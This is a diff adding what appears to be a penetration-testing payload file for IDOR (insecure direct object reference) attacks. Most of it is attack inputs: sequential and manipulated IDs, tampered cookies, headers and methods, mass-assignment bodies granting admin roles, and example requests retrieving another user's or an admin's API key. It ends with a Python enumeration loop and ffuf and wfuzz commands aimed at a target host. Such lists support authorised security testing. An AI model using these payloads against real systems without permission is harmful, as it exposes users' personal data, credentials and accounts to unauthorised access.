@@ -1,0 +1,297 @@
+# IDOR (Insecure Direct Object Reference) Payloads
+
+## ========================================
+## NUMERIC ID ENUMERATION
+## ========================================
+
+# Sequential IDs
+/api/user/1
+/api/user/2
+/api/user/3
+/api/user/100
+/api/user/1000
+
+# Negative IDs
+/api/user/-1
+/api/user/-100
+
+# Large numbers
+/api/user/999999999
+/api/user/2147483647
+
+# Zero
+/api/user/0
+
+## ========================================
+## UUID/GUID ENUMERATION
+## ========================================
+
+# Version 1 UUIDs (time-based)
+a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11
+550e8400-e29b-41d4-a716-446655440000
+
+# Version 4 UUIDs (random)
+123e4567-e89b-12d3-a456-426614174000
+f47ac10b-58cc-4372-a567-0e02b2c3d479
+
+# Short UUIDs
+a1b2c3d4
+12345678
+
+## ========================================
+## PARAMETER MANIPULATION
+## ========================================
+
+# Change user ID
+?user_id=123
+?user_id=456
+?user_id=admin
+
+# Change account ID
+?account_id=1
+?account_id=2
+
+# Change document ID
+?doc_id=1
+?doc_id=999
+
+# Change order ID
+?order_id=1001
+?order_id=1002
+
+## ========================================
+## PATH TRAVERSAL IDOR
+## ========================================
+
+/user/123/profile
+/user/456/profile
+/user/admin/profile
+
+/account/1/settings
+/account/2/settings
+
+/api/v1/users/123
+/api/v1/users/456
+
+## ========================================
+## OBJECT TYPE MODIFICATION
+## ========================================
+
+# Change object type
+?type=user&id=123
+?type=admin&id=123
+
+# Change resource type
+?resource=profile&id=1
+?resource=admin_profile&id=1
+
+## ========================================
+## HTTP METHOD TAMPERING
+## ========================================
+
+# GET to POST
+GET /api/user/123 → POST /api/user/123
+
+# PUT to PATCH
+PUT /api/user/123 → PATCH /api/user/123
+
+# DELETE different user
+DELETE /api/user/456
+
+## ========================================
+## PARAMETER POLLUTION
+## ========================================
+
+?user_id=123&user_id=456
+?id=self&id=admin
+?account=1&account=2
+
+## ========================================
+## BODY PARAMETER IDOR
+## ========================================
+
+# JSON
+{"user_id": 123}
+{"user_id": 456}
+{"account_id": 1}
+
+# XML
+<user_id>123</user_id>
+<user_id>456</user_id>
+
+## ========================================
+## COOKIE MANIPULATION
+## ========================================
+
+# User ID in cookie
+Cookie: user_id=123
+Cookie: user_id=456
+Cookie: user_id=admin
+
+# Session with ID
+Cookie: session=user_123
+Cookie: session=user_456
+
+## ========================================
+## HEADER MANIPULATION
+## ========================================
+
+# Custom headers
+X-User-ID: 123
+X-User-ID: 456
+
+X-Account-ID: 1
+X-Account-ID: 2
+
+## ========================================
+## HASH/TOKEN IDOR
+## ========================================
+
+# Weak hashing (predictable)
+?token=md5(123) = 202cb962ac59075b964b07152d234b70
+?token=md5(456) = 250cf8b51c773f3f8dc8b4be867a9a02
+
+# Incremental tokens
+?reset_token=abc123
+?reset_token=abc124
+?reset_token=abc125
+
+## ========================================
+## FILE/RESOURCE ACCESS
+## ========================================
+
+# File downloads
+/download?file=invoice_123.pdf
+/download?file=invoice_456.pdf
+
+# Image access
+/images/user/123.jpg
+/images/user/456.jpg
+
+# Document access
+/docs/contract_1.pdf
+/docs/contract_2.pdf
+
+## ========================================
+## API ENDPOINT IDOR
+## ========================================
+
+# REST API
+GET /api/users/123
+GET /api/users/456
+
+GET /api/orders/1001
+GET /api/orders/1002
+
+# GraphQL
+{user(id: 123) {email, phone}}
+{user(id: 456) {email, phone}}
+
+## ========================================
+## MASS ASSIGNMENT IDOR
+## ========================================
+
+# Add admin field
+{"user_id": 123, "role": "admin"}
+{"user_id": 123, "is_admin": true}
+{"user_id": 123, "permissions": ["all"]}
+
+## ========================================
+## RACE CONDITION IDOR
+## ========================================
+
+# Rapid ID enumeration
+Parallel requests to /api/user/[1-1000]
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify object references
+- IDs in URLs, parameters, body, headers
+
+# 2. Test sequential access
+- Increment/decrement IDs
+- Try common IDs (0, 1, 100, admin)
+
+# 3. Test unauthorized access
+- Access other users' resources
+- Try administrative functions
+
+# 4. Test different methods
+- GET, POST, PUT, DELETE, PATCH
+
+# 5. Test parameter manipulation
+- Change IDs, types, roles
+
+## ========================================
+## COMMON VULNERABLE ENDPOINTS
+## ========================================
+
+/user/profile?id=
+/account/settings?id=
+/api/user/
+/download?file=
+/order/view?id=
+/invoice/download?id=
+/api/v1/users/
+/messages/view?id=
+/documents/
+/images/user/
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Profile access
+GET /api/user/123/profile
+Response: {"username": "victim", "email": "victim@example.com"}
+
+# Try accessing other user
+GET /api/user/456/profile
+Response: {"username": "admin", "email": "admin@example.com"}
+
+# Example 2: Document download
+GET /download?file=contract_123.pdf
+# Try other documents
+GET /download?file=contract_124.pdf
+
+# Example 3: API key access
+GET /api/users/123/apikey
+Response: {"apikey": "sk_live_xxxxx"}
+# Try admin's API key
+GET /api/users/1/apikey
+
+## ========================================
+## AUTOMATION
+## ========================================
+
+# Burp Intruder
+1. Send request to Intruder
+2. Mark ID as insertion point
+3. Use number payload (1-1000)
+4. Analyze responses
+
+# Python script
+for i in range(1, 1000):
+    url = f"http://target.com/api/user/{i}"
+    response = requests.get(url, cookies=cookies)
+    if response.status_code == 200:
+        print(f"Valid ID: {i}")
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Intruder for enumeration
+- Autorize extension for IDOR testing
+
+# Postman
+- Collection runner with variables
+
+# ffuf
+ffuf -u http://target.com/api/user/FUZZ -w ids.txt
+
+# wfuzz
+wfuzz -z range,1-1000 http://target.com/api/user/FUZZ
